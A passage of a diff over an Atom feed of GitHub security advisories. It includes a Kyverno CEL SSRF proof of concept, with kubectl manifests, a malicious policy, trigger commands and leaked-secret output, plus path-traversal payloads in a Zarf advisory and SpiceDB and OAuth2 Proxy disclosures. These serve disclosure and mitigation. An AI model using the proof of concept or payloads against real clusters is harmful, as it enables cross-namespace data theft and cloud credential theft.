-EOF
-</code></pre>
-<h3 id="2-create-sensitive-internal-service-simulating-internal-api-or-cloud-metadata">2. Create sensitive internal service (simulating internal API or cloud metadata)</h3>
-<pre><code class="language-bash">cat &lt;&lt;EOF | kubectl apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: internal-api
-  namespace: kube-system
-  labels:
-    app: internal-api
-spec:
-  containers:
-  - name: server
-    image: hashicorp/http-echo
-    args:
-      - "-text={\"secret\": \"STOLEN_INTERNAL_SECRET_12345\", \"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\"}"
-      - "-listen=:8080"
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: internal-api
-  namespace: kube-system
-spec:
-  selector:
-    app: internal-api
-  ports:
-  - port: 80
-    targetPort: 8080
-EOF
-</code></pre>
-<h3 id="3-verify-attacker-cannot-access-kube-system-directly">3. Verify attacker cannot access kube-system directly</h3>
-<pre><code class="language-bash">kubectl auth can-i get pods -n kube-system --as=system:serviceaccount:attacker-ns:namespace-admin
-# Output: no
-</code></pre>
-<h3 id="4-create-malicious-namespacedvalidatingpolicy-as-attacker">4. Create malicious NamespacedValidatingPolicy (as attacker)</h3>
-<pre><code class="language-bash">cat &lt;&lt;EOF | kubectl apply --as=system:serviceaccount:attacker-ns:namespace-admin -f -
-apiVersion: policies.kyverno.io/v1beta1
-kind: NamespacedValidatingPolicy
-metadata:
-  name: cel-ssrf-poc
-  namespace: attacker-ns
-spec:
-  matchConstraints:
-    resourceRules:
-      - apiGroups: [""]
-        apiVersions: ["v1"]
-        operations: ["CREATE"]
-        resources: ["configmaps"]
-  variables:
-    - name: stolenData
-      expression: |
-        http.Get('http://internal-api.kube-system.svc.cluster.local')
-  validations:
-    - expression: "false"
-      message: "Validation failed"
-      messageExpression: |
-        'SSRF_LEAKED: secret=' + variables.stolenData['secret'] + ' token=' + variables.stolenData['token']
-EOF
-</code></pre>
-<h3 id="5-trigger-exploit-and-exfiltrate-data">5. Trigger exploit and exfiltrate data</h3>
-<pre><code class="language-bash">kubectl create configmap trigger --from-literal=x=y -n attacker-ns \
-  --as=system:serviceaccount:attacker-ns:namespace-admin
-</code></pre>
-<h3 id="6-result---secret-data-exfiltrated">6. Result - Secret data exfiltrated</h3>
-<pre><code>error: failed to create configmap: admission webhook "nvpol.validate.kyverno.svc-fail" 
-denied the request: Policy cel-ssrf-poc failed: 
-SSRF_LEAKED: secret=STOLEN_INTERNAL_SECRET_12345 token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
-</code></pre>
-<h2 id="impact">Impact</h2>
-<ol>
-<li><strong>Cross-namespace data access</strong>: Users with only namespace-scoped permissions can access services in any namespace</li>
-<li><strong>Cloud credential theft</strong>: Access to <code>http://169.254.169.254/...</code> allows stealing AWS/GCP/Azure IAM credentials</li>
-<li><strong>Data exfiltration</strong>: HTTP response data exposed via validation error messages or audit annotations</li>
-<li><strong>Breaks namespace isolation</strong>: Inconsistent with Kyverno's security model where <code>resource.Lib</code> enforces namespace boundaries</li>
-</ol>
-<h2 id="affected-policies">Affected Policies</h2>
-<p>All CEL-based namespaced policies in <code>policies.kyverno.io</code> API group:</p>
-<ul>
-<li><code>NamespacedValidatingPolicy</code></li>
-<li><code>NamespacedMutatingPolicy</code> </li>
-<li><code>NamespacedDeletingPolicy</code></li>
-<li><code>NamespacedImageValidatingPolicy</code></li>
-</ul>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Add namespace and URL restrictions to <code>pkg/cel/libs/http/http.go</code>, similar to how <code>resource.Lib</code> enforces namespace boundaries:</p>
-<pre><code class="language-go">type lib struct {
-    namespace string  // Add namespace parameter
-    version   *version.Version
-}
-
-func (r *contextImpl) Get(url string, headers map[string]string) (any, error) {
-    if err := r.validateURL(url); err != nil {
-        return nil, fmt.Errorf("blocked URL: %w", err)
-    }
-    // ... existing code
-}
-
-func (r *contextImpl) validateURL(urlStr string) error {
-    // Block cloud metadata (169.254.0.0/16)
-    // Block localhost/loopback (127.0.0.0/8)
-    // For namespaced policies: restrict to same namespace services only
-}
-</code></pre>
-<p>Attached 
-<a href="https://github.com/user-attachments/files/24940825/kyverno-cel-ssrf-poc.sh">kyverno-cel-ssrf-poc.sh</a></p>
-<h2 id="credit">Credit</h2>
-<p>Discovered by: Igor Stepansky
-Organization: Orca Security
-Email: <a href="mailto:igor.stepansky@orca.security">igor.stepansky@orca.security</a>
-Personal Email: <a href="mailto:stepanskyigor@gmail.com">stepanskyigor@gmail.com</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kyverno/kyverno/security/advisories/GHSA-rggm-jjmc-3394">https://github.com/kyverno/kyverno/security/advisories/GHSA-rggm-jjmc-3394</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4789">https://nvd.nist.gov/vuln/detail/CVE-2026-4789</a></li>
-<li><a href="https://github.com/kyverno/kyverno/pull/15729">https://github.com/kyverno/kyverno/pull/15729</a></li>
-<li><a href="https://www.kb.cert.org/vuls/id/655822">https://www.kb.cert.org/vuls/id/655822</a></li>
-<li><a href="https://github.com/advisories/GHSA-rggm-jjmc-3394">https://github.com/advisories/GHSA-rggm-jjmc-3394</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rggm-jjmc-3394</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-14T22:37:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/authzed/spicedb] SpiceDB's SPICEDB_DATASTORE_CONN_URI is leaked on startup logs]]></title>
-        <id>https://github.com/advisories/GHSA-jf4f-rr2c-9m58</id>
-        <link href="https://github.com/advisories/GHSA-jf4f-rr2c-9m58"/>
-        <updated>2026-04-14T22:33:07.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>When SpiceDB starts with log level <code>info</code>, the startup <code>"configuration"</code> log will include the full datastore DSN, including the plaintext password, inside <code>DatastoreConfig.URI</code>.</p>
-<h3 id="patches">Patches</h3>
-<p>v1.51.1</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Change the log level to <code>warn</code> or <code>error</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/authzed/spicedb/security/advisories/GHSA-jf4f-rr2c-9m58">https://github.com/authzed/spicedb/security/advisories/GHSA-jf4f-rr2c-9m58</a></li>
-<li><a href="https://github.com/advisories/GHSA-jf4f-rr2c-9m58">https://github.com/advisories/GHSA-jf4f-rr2c-9m58</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jf4f-rr2c-9m58</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-14T22:33:06.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/zarf-dev/zarf] Zarf has a Path Traversal via Malicious Package Metadata.Name — Arbitrary File Write]]></title>
-        <id>https://github.com/advisories/GHSA-pj97-4p9w-gx3q</id>
-        <link href="https://github.com/advisories/GHSA-pj97-4p9w-gx3q"/>
-        <updated>2026-04-14T22:32:55.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>This vulnerability impacts users of <code>zarf package inspect sbom</code> or <code>zarf package inspect documentation</code> on untrusted packages.</p>
-<h3 id="patches">Patches</h3>
-<p>#4793, now fixed in version v0.74.2</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Avoid inspecting unsigned packages</p>
-<h2 id="description">Description</h2>
-<p>The <code>package inspect sbom</code> and <code>package inspect documentation</code> subcommands construct output file paths by joining a user-controlled output directory with the package's <code>Metadata.Name</code> field, which is attacker-controlled data read from the package archive. The <code>Metadata.Name</code> field is validated against a regex on create, <code>^[a-z0-9][a-z0-9\-]*$</code>, however a malicious user could unarchive a package to change the <code>.Metadata.Name</code> field and the files inside the SBOMS.tar.  This would lead to arbitrary file write in a location of the attackers choosing. </p>
-<p>Neither location sanitizes or validates the package name before using it in the file path.</p>
-<p><strong>SBOM inspection:</strong></p>
-<pre><code class="language-go">outputPath := filepath.Join(o.outputDir, pkgLayout.Pkg.Metadata.Name)
-err = pkgLayout.GetSBOM(ctx, outputPath)
-</code></pre>
-<p><strong>Documentation inspection (line 1219):</strong></p>
-<pre><code class="language-go">outputPath := filepath.Join(o.outputDir, fmt.Sprintf("%s-documentation", pkgLayout.Pkg.Metadata.Name))
-return pkgLayout.GetDocumentation(ctx, outputPath, o.keys)
-</code></pre>
-<p><code>pkgLayout.Pkg.Metadata.Name</code> is read directly from the untrusted package's <code>zarf.yaml</code> manifest. An attacker can craft a malicious Zarf package where <code>Metadata.Name</code> contains path traversal sequences or root paths such as <code>../../etc/cron.d/malicious</code> or <code>/home/user/.ssh/authorized_keys</code>.</p>
-<h3 id="cvss-explainations">CVSS Explainations</h3>
-<h4 id="attack-vector">Attack Vector</h4>
-<p>Verdict: Network
-A malicious package could be published to OCI and inspected directly with <code>zarf package inspect sbom oci://&lt;bad-package&gt;</code></p>
-<h4 id="attack-complexity">Attack Complexity</h4>
-<p>Verdict: Low
-It is not complicated to make and publish a malicious package. The Attacker only needs to edit the zarf.yaml and sboms.tar then edit the checksums.</p>
-<h4 id="privileges-required">Privileges Required</h4>
-<p>Verdict: None
-The attacker is relying on the runner of <code>zarf package inspect sbom|documentation</code> and needs no other privileges.</p>
-<h4 id="user-interaction">User Interaction</h4>
-<p>Verdict: Required
-The user must run the inspect command</p>
-<h4 id="scope">Scope</h4>
-<p>Verdict: Unchanged
-The vulnerability operates entirely within the permissions of the user running zarf package inspect. The file write can't escape the privilege boundary of that user </p>
-<h4 id="confidentiality">Confidentiality</h4>
-<p>Verdict: None
-This is an arbitrary file write vulnerability. The attacker can place or overwrite files on the filesystem but the vulnerability does not provide any mechanism to read or exfiltrate data from the target system.</p>
-<h4 id="integrity">Integrity</h4>
-<p>Verdict: High
-The attacker controls both the file path (via Metadata.Name) and the file content (via the SBOM or documentation files inside the archive). This allows writing attacker-controlled content to arbitrary locations on the filesystem, limited only by the permissions of the user running the inspect command. Realistic exploitation includes writing SSH authorized_keys, cron jobs, or shell profiles.</p>
-<h3 id="availability">Availability</h3>
-<p>Verdict: Low
-The vulnerability does not directly target service availability. However, an attacker could overwrite files that cause system disruption.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/zarf-dev/zarf/security/advisories/GHSA-pj97-4p9w-gx3q">https://github.com/zarf-dev/zarf/security/advisories/GHSA-pj97-4p9w-gx3q</a></li>
-<li><a href="https://github.com/zarf-dev/zarf/pull/4793">https://github.com/zarf-dev/zarf/pull/4793</a></li>
-<li><a href="https://github.com/advisories/GHSA-pj97-4p9w-gx3q">https://github.com/advisories/GHSA-pj97-4p9w-gx3q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-pj97-4p9w-gx3q</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-14T22:32:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/oauth2-proxy/oauth2-proxy]  OAuth2 Proxy's Health Check User-Agent Matching Bypasses Authentication in auth_request Mode]]></title>
-        <id>https://github.com/advisories/GHSA-5hvv-m4w4-gf6v</id>
-        <link href="https://github.com/advisories/GHSA-5hvv-m4w4-gf6v"/>
-        <updated>2026-04-15T21:06:39.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>A configuration-dependent authentication bypass exists in OAuth2 Proxy.</p>
-<p>Deployments are affected when all of the following are true:</p>
-<ul>
-<li>OAuth2 Proxy is used with an <code>auth_request</code>-style integration   (for example, nginx <code>auth_request</code>)</li>
-<li><code>--ping-user-agent</code> is set or <code>--gcp-healthchecks</code> is enabled</li>
-</ul>
-<p>In affected configurations, OAuth2 Proxy will treat a request with the configured health check <code>User-Agent</code> value as a successful health check regardless of the requested path. This allows an unauthenticated remote attacker to bypass authentication and access protected upstream resources without completing the normal login flow.</p>
-<p>This issue does not affect deployments that do not use <code>auth_request</code>-style subrequests, or that do not enable  <code>--ping-user-agent</code>/<code>--gcp-healthchecks</code>.</p>
-<h3 id="patches">Patches</h3>
-<p>Users should upgrade to <code>v7.15.2</code> or later once available. Deployments running versions prior to <code>v7.15.2</code> should be considered affected if they use <code>auth_request</code>-style authentication together with <code>--ping-user-agent</code> or  <code>--gcp-healthchecks</code>.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Users can mitigate this issue by:</p>
-<ul>
-<li>disabling <code>--gcp-healthchecks</code></li>
-<li>removing any configured <code>--ping-user-agent</code></li>
-<li>ensuring the reverse proxy does not forward client-controlled <code>User-Agent</code>  headers to the OAuth2 Proxy auth subrequest</li>
-<li>using path-based health checks only, on dedicated health check endpoints</li>
-</ul>
-<p>Example nginx mitigation for the auth subrequest:</p>
-<pre><code class="language-nginx">location = /oauth2/auth {
-    internal;
-    proxy_pass http://127.0.0.1:4180;
-    proxy_pass_request_body off;
-    proxy_set_header Content-Length "";
-    proxy_set_header Host $host;
-    # set to value that isn't the same as your configured PingUserAgent or GCPs "GoogleHC/1.0"
-    proxy_set_header User-Agent "oauth2-proxy-auth-request";
-}
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/oauth2-proxy/oauth2-proxy/security/advisories/GHSA-5hvv-m4w4-gf6v">https://github.com/oauth2-proxy/oauth2-proxy/security/advisories/GHSA-5hvv-m4w4-gf6v</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34457">https://nvd.nist.gov/vuln/detail/CVE-2026-34457</a></li>
-<li><a href="https://github.com/oauth2-proxy/oauth2-proxy/releases/tag/v7.15.2">https://github.com/oauth2-proxy/oauth2-proxy/releases/tag/v7.15.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-5hvv-m4w4-gf6v">https://github.com/advisories/GHSA-5hvv-m4w4-gf6v</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5hvv-m4w4-gf6v</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-04-14T22:31:19.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/oauth2-proxy/oauth2-proxy/v7]  OAuth2 Proxy's Health Check User-Agent Matching Bypasses Authentication in auth_request Mode]]></title>
-        <id>https://github.com/advisories/GHSA-5hvv-m4w4-gf6v</id>
-        <link href="https://github.com/advisories/GHSA-5hvv-m4w4-gf6v"/>
-        <updated>2026-04-15T21:06:39.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>A configuration-dependent authentication bypass exists in OAuth2 Proxy.</p>
-<p>Deployments are affected when all of the following are true:</p>
-<ul>
-<li>OAuth2 Proxy is used with an <code>auth_request</code>-style integration   (for example, nginx <code>auth_request</code>)</li>
-<li><code>--ping-user-agent</code> is set or <code>--gcp-healthchecks</code> is enabled</li>
-</ul>
-<p>In affected configurations, OAuth2 Proxy will treat a request with the configured health check <code>User-Agent</code> value as a successful health check regardless of the requested path. This allows an unauthenticated remote attacker to bypass authentication and access protected upstream resources without completing the normal login flow.</p>
-<p>This issue does not affect deployments that do not use <code>auth_request</code>-style subrequests, or that do not enable  <code>--ping-user-agent</code>/<code>--gcp-healthchecks</code>.</p>
-<h3 id="patches">Patches</h3>
-<p>Users should upgrade to <code>v7.15.2</code> or later once available. Deployments running versions prior to <code>v7.15.2</code> should be considered affected if they use <code>auth_request</code>-style authentication together with <code>--ping-user-agent</code> or  <code>--gcp-healthchecks</code>.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Users can mitigate this issue by:</p>
-<ul>
-<li>disabling <code>--gcp-healthchecks</code></li>
-<li>removing any configured <code>--ping-user-agent</code></li>
-<li>ensuring the reverse proxy does not forward client-controlled <code>User-Agent</code>  headers to the OAuth2 Proxy auth subrequest</li>
-<li>using path-based health checks only, on dedicated health check endpoints</li>
-</ul>
-<p>Example nginx mitigation for the auth subrequest:</p>
-<pre><code class="language-nginx">location = /oauth2/auth {
-    internal;
-    proxy_pass http://127.0.0.1:4180;
-    proxy_pass_request_body off;
-    proxy_set_header Content-Length "";
-    proxy_set_header Host $host;
-    # set to value that isn't the same as your configured PingUserAgent or GCPs "GoogleHC/1.0"
-    proxy_set_header User-Agent "oauth2-proxy-auth-request";
-}
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/oauth2-proxy/oauth2-proxy/security/advisories/GHSA-5hvv-m4w4-gf6v">https://github.com/oauth2-proxy/oauth2-proxy/security/advisories/GHSA-5hvv-m4w4-gf6v</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34457">https://nvd.nist.gov/vuln/detail/CVE-2026-34457</a></li>
-<li><a href="https://github.com/oauth2-proxy/oauth2-proxy/releases/tag/v7.15.2">https://github.com/oauth2-proxy/oauth2-proxy/releases/tag/v7.15.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-5hvv-m4w4-gf6v">https://github.com/advisories/GHSA-5hvv-m4w4-gf6v</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5hvv-m4w4-gf6v</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-04-14T22:31:19.000Z</published>
     </entry>
 </feed>
